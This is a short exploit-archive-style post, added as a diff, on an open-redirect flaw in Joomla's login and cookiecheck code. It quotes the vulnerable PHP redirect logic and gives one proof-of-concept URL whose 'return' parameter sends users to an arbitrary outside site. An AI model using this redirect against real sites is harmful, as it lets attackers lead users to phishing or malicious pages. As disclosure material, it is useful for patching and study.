@@ -1,0 +1,65 @@
+============================================
+Joomla!   (Multiple) ExploiT
+
+============================================
+
+#  Powered  Joomla! 1.5 & All version Down  (Multiple)
+ 
+ 
+# Author: Mr.MLL
+# Published: 2010-08-24
+# Verified: yes
+# Download Exploit Code
+# Download N/A
+ 
+===
+ 
+ 
+# Software :  http://www.joomla.org/download.html
+# Vendor   :  http://www.joomla.org/
+# Contact  :  Y-3@hotmail.com
+ 
+===
+
+
+<?php
+    }
+
+    if ( $return && !( strpos( $return, 'com_registration' ) || strpos( $return, 'com_login' ) ) ) {
+    // checks for the presence of a return url
+    // and ensures that this url is not the registration or login pages
+        // If a sessioncookie exists, redirect to the given page. Otherwise, take an extra round for a cookiecheck
+        if (isset( $_COOKIE[mosMainFrame::sessionCookieName()] )) {
+            mosRedirect( $return );
+        } else {
+            mosRedirect( $mosConfig_live_site .'/index.php?option=cookiecheck&return=' . urlencode( $return ) );
+        }
+    } else {
+        // If a sessioncookie exists, redirect to the start page. Otherwise, take an extra round for a cookiecheck
+        if (isset( $_COOKIE[mosMainFrame::sessionCookieName()] )) {
+            mosRedirect( $mosConfig_live_site .'/index.php' );
+        } else {
+            mosRedirect( $mosConfig_live_site .'/index.php?option=cookiecheck&return=' . urlencode( $mosConfig_live_site .'/index.php' ) );
+        }
+    }
+
+} else if ($option == 'logout') {
+    $mainframe->logout();
+
+    // JS Popup message
+    if ( $message ) {
+        ?>
+
+=========
+# ExploiT
+ 
+    http://127.0.0.1/path/index.php?option=cookiecheck&return=http://Google.com/
+ 
+ 
+=========
+
+# Thanks : milw0rm.com & exploit-db.com  & offsec.com & inj3ct0r.com & www.hack0wn.com
+
+exit ,, / Praise be to God for the blessing of Islam
+
+ 		 	   		  
